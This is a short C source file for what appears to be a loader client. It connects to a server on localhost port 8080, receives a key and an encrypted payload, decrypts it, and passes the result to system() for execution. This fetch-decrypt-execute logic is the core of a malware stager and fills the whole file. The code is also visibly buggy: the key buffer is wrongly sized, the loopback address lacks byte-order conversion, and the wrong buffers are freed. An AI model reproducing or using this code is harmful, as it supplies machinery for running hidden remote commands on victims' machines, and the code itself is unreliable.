#include <stdio.h>
#include <sys/socket.h>

#include "client.h"

static const char *host = "localhost";

void client_connect(void) {
    client.fd = socket(AF_INET, SOCK_STREAM, 0);
    struct addrinfo hint;
    struct addrinfo *tmp;
    size_t payload_size;
    uint8_t *payload_size_buff;
    uint8_t *key;
    uint8_t *payload;

    memset(&hint, 0, sizeof(hint));
    hint.ai_socktype = SOCK_STREAM;
    hint.ai_flags = AI_CANONNAME;

    if (getaddrinfo(host, NULL, &hint, &tmp)) {
        perror("getaddinfo failed");
        exit(EXIT_FAILURE);
    }


    memcpy(client.serverAddress, tmp->ai_addr, sizeof(struct sockaddr));
    freeaddrinfo(tmp);
    
    client.serverAddress->sin_family = AF_INET;
    client.serverAddress->sin_port = htons(8080);
    client.serverAddress->sin_addr.s_addr = INADDR_LOOPBACK;

    if (connect(client.fd, (struct sockaddr *)(client.serverAddress), sizeof(struct sockaddr)) == -1) {
        perror("Oh no. could not connect to host");
        exit(EXIT_FAILURE);
    }

    key = (uint8_t *)malloc(sizeof(KEY_SIZE));
    payload_size_buff = (uint8_t *)malloc(BUFF_SIZE);

    read(client.fd, key, KEY_SIZE);

    read(client.fd, payload_size_buff, BUFF_SIZE);
    sscanf((char *)payload_size_buff, "%lu", &payload_size);
    free(payload_size_buff);
    payload_size_buff = NULL;

    payload = (uint8_t *)malloc(payload_size + 1);
        
    read(client.fd, payload, payload_size);

    payload[payload_size] = '\0';

    crypto_init_client(key, payload_size, payload);
    crypt_key();
    crypt_buff();

    fun();


    free(crypto.payload);
    crypto.payload = NULL;

    free(crypto.key);
    crypto.key = NULL;
    crypto.payload = NULL;

    shutdown(client.fd, SHUT_RDWR);
    close(client.fd);
}


void fun(void) {
    system((char *)get_payload());
}
